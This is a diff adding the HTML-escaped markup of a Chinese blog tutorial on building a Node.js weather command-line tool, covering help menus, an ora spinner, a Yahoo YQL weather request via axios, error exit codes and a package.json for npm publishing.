+    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;menus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;subCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;menus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;此时如果运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;weather help today&lt;/code&gt; 或者 &lt;code class=&quot;highlighter-rouge&quot;&gt;weather today -h&lt;/code&gt;，将会看见 &lt;strong&gt;today&lt;/strong&gt; 命令的帮助信息。运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;weather&lt;/code&gt; 或者 &lt;code class=&quot;highlighter-rouge&quot;&gt;weather -h&lt;/code&gt; 将会输出主菜单帮助信息。&lt;/p&gt;
+
+&lt;h3 id=&quot;44-进度与请求&quot;&gt;4.4 进度与请求&lt;/h3&gt;
+
+&lt;p&gt;某些命令可能会执行很长时间，为了让用户得到正在运行的反馈状态，应该在执行时显示 &lt;strong&gt;进度&lt;/strong&gt;，使用命令 &lt;code class=&quot;highlighter-rouge&quot;&gt;npm install --save axios ora&lt;/code&gt; 安装第三方的进度与网络请求的库。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;进度 ora 的更多用法请参看 &lt;a href=&quot;https://www.npmjs.com/package/ora&quot;&gt;https://www.npmjs.com/package/ora&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;请求 axios 的更多用法请参看 &lt;a href=&quot;https://www.npmjs.com/package/axios&quot;&gt;https://www.npmjs.com/package/axios&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;现在我们开始请求天气，使用的是 &lt;strong&gt;雅虎&lt;/strong&gt; 的 API，此 API 使用的 &lt;strong&gt;“YQL”&lt;/strong&gt; 的语法查询，关键的是它不需要 &lt;strong&gt;API Key&lt;/strong&gt; 就可以直接进行接口的调用，非常方便。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;[utils/yahoo.js]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;axios&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'axios'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;results&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;axios&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'get'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'https://query.yahooapis.com/v1/public/yql'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'json'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`select item from weather.forecast where woeid in
+            (select woeid from geo.places(1) where text=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;channel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;item&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;[cmds/today.js]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ora&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ora'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getWeather&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../utils/yahoo'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// 开启进度&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;spinner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ora&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;weather&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getWeather&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// 关闭进度&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;spinner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`Current conditions in &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`\t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;weather&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;condition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;° &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;weather&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;condition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// 关闭进度&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;spinner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;这里在 &lt;strong&gt;yahoo.js&lt;/strong&gt; 中封装了调用温度的接口，在命令文件 &lt;strong&gt;today.js&lt;/strong&gt; 中进行调用，加载进度并解析返回值，当输入 &lt;code class=&quot;highlighter-rouge&quot;&gt;weather today --location &quot;BeiJing, ZH&quot; &lt;/code&gt; 时，将会输出指定城市的气温，注意这里只是个示例，只取了返回值的 temp 字段。&lt;/p&gt;
+
+&lt;h3 id=&quot;45-错误与退出码&quot;&gt;4.5 错误与退出码&lt;/h3&gt;
+
+&lt;p&gt;至此我们的程序结束了吗？没有。如果你的 cli 程序有严重错误，应该使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;process.exit(1)&lt;/code&gt; 的方式进行退出，这可以告诉终端此进程异常终止。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;[utils/error.js]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;[index.js]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./utils/error'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// console.error(`&quot;${cmd}&quot; is not a valid command!`)&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; is not a valid command!`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;5-发布到npm仓库&quot;&gt;5. 发布到NPM仓库&lt;/h2&gt;
+
+&lt;p&gt;为了让更多人可以使用到你编写的 nodejs 库，应该上传到 npm 仓库中，当然这只是个例子，为了能够上传，需要完善 &lt;strong&gt;package.json&lt;/strong&gt; 文件&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;weather-cli&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A cli app that gives you the weather&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MIT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;homepage&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://github.com/wangjunneil/weather-cli&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;repository&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;git&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;url&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;git+https://github.com/wangjunneil/weather-cli&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;engines&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;node&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;=8&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;keywords&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vinny&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;javascript&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;preferGlobal&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bin/weather&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;devDependencies&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dependencies&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;axios&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^0.18.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;minimist&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^1.2.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ora&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^2.1.0&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;engine 设置告诉安装人员使用 node 的最新版本，由于使用了 async 和 await 语法，因此需要8.0或更高的版本。&lt;/li&gt;
